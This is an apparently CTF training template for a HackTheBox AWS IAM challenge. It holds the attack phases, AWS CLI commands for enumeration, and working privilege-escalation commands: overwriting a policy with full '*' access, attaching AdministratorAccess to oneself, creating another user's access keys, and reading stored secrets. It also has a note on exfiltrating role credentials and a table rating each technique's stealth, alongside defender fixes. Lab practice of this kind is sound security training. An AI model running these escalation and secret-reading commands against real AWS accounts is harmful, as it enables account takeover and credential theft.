---
title: "HTB Cloud Series Day 1 — AWS IAM Misconfiguration"
tags: [HTB, HackTheBox, CTF, cloud, AWS, IAM, privilege-escalation, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 306
related_topics:
  - HTB API Series Day 5 (Day 305)
  - Cloud Exploitation (R-09)
  - OWASP API Top 10 (Day 146)
---

# Day 306 — HTB Cloud Series Day 1: AWS IAM Misconfiguration

> "IAM is the perimeter in cloud. Get the keys, get the kingdom. The mistake
> attackers count on is that defenders think 'we have MFA' and stop there.
> They never audit what the authenticated identity is allowed to do."
>
> — Ghost

---

## Goals

Exploit AWS IAM misconfiguration in an HTB cloud challenge.
Enumerate permissions from a compromised credential and escalate privileges.

**Time budget:** 4–5 hours.

---

## Pre-Engagement Plan

```
Target: HTB Cloud challenge — AWS IAM focus
Hypothesis: Initial credential has limited permissions but can assume a
            more privileged role or enumerate to find escalation path.

Tools:
  - aws cli (configured with target keys)
  - pacu (AWS exploitation framework)
  - enumerate-iam.py
  - CloudMapper (optional — visualisation)

Attack phases:
  1. Credential enumeration — who am I, what can I do?
  2. Permission boundary analysis
  3. Privilege escalation path identification
  4. Lateral movement / data access
  5. Flag retrieval
```

---

## Engagement Log

### Phase 1 — Credential Validation and Identity

```bash
# Configure temporary profile
aws configure --profile htb-target
# AWS Access Key ID: ___
# AWS Secret Access Key: ___
# Default region: us-east-1

# Who am I?
aws sts get-caller-identity --profile htb-target
```

```
Result:
  Account: ___
  UserId:  ___
  ARN:     arn:aws:iam::ACCOUNT:user/___
```

### Phase 2 — IAM Enumeration

```bash
# List attached policies
aws iam list-attached-user-policies \
  --user-name TARGET_USER \
  --profile htb-target

# List inline policies
aws iam list-user-policies \
  --user-name TARGET_USER \
  --profile htb-target

# Get inline policy document
aws iam get-user-policy \
  --user-name TARGET_USER \
  --policy-name POLICY_NAME \
  --profile htb-target

# List available roles (if ListRoles is allowed)
aws iam list-roles \
  --profile htb-target

# Check what roles I can assume
aws iam list-attached-user-policies \
  --user-name TARGET_USER \
  --profile htb-target
```

```
Policies found:
  - ___
  - ___

Inline policy content: ___

Assumable roles: ___
```

### Phase 3 — Permission Brute-Force (enumerate-iam.py)

```bash
# enumerate-iam finds all allowed actions by trial and error
python3 enumerate-iam.py \
  --access-key AKID \
  --secret-key SECRET \
  --region us-east-1
```

```
Permissions confirmed:
  iam: ___
  s3:  ___
  ec2: ___
  sts: ___
  Other: ___
```

### Phase 4 — Privilege Escalation

Common IAM escalation paths to check:

```
[ ] iam:CreatePolicyVersion     — overwrite a policy with AdministratorAccess
    aws iam create-policy-version \
      --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY \
      --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
      --set-as-default

[ ] iam:AttachUserPolicy        — attach AdministratorAccess to self
    aws iam attach-user-policy \
      --user-name TARGET_USER \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

[ ] iam:PassRole + ec2:RunInstances — launch EC2 with admin role, pull metadata
    aws ec2 run-instances --iam-instance-profile Name=ADMIN_ROLE ...

[ ] sts:AssumeRole               — assume a more privileged role
    aws sts assume-role \
      --role-arn arn:aws:iam::ACCOUNT:role/ROLE_NAME \
      --role-session-name pwned

[ ] lambda:CreateFunction + iam:PassRole — create Lambda with admin role, invoke
    Payload: exfil env vars containing role credentials

[ ] iam:CreateAccessKey          — create keys for another user
    aws iam create-access-key --user-name admin_user
```

```
Escalation path used: ___
New identity / permissions: ___
```

### Phase 5 — Flag Retrieval

```bash
# Common flag locations in AWS challenges
aws s3 ls --profile escalated
aws s3 ls s3://BUCKET --recursive --profile escalated
aws ssm get-parameter --name /flag --with-decryption --profile escalated
aws secretsmanager list-secrets --profile escalated
aws secretsmanager get-secret-value --secret-id FLAG_SECRET --profile escalated
```

### Flag

```
FLAG{___}
Escalation path: ___
Total time: ___ min
```

---

## Debrief

### IAM Privilege Escalation Techniques — Quick Reference

| Technique | Required Permission | Stealth Level |
|---|---|---|
| Create policy version | `iam:CreatePolicyVersion` | Medium |
| Attach policy to self | `iam:AttachUserPolicy` | Low |
| Assume privileged role | `sts:AssumeRole` | High |
| Pass role to Lambda | `iam:PassRole` + `lambda:*` | Medium |
| Create access key for other user | `iam:CreateAccessKey` | Low |

### Real-World Connection

```
This technique class appeared in:
  - Capital One breach (2019): SSRF → metadata → EC2 role with excessive S3 permissions
  - Multiple AWS misconfig bounties on HackerOne (average: $5,000–$30,000 P1)

Defender fix:
  1. Principle of least privilege — audit with IAM Access Analyzer
  2. SCPs (Service Control Policies) to prevent privilege escalation at the org level
  3. CloudTrail → alert on CreatePolicyVersion / AttachUserPolicy
  4. Deny iam:* except via specific roles (boundary policies)
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q306.1, Q306.2 …).

---

## Navigation

← Previous: [Day 305 — HTB API Series Day 5](DAY-0305-HTB-API-Series-Day-05.md)
→ Next: [Day 307 — HTB Cloud Series Day 2](DAY-0307-HTB-Cloud-Series-Day-02.md)
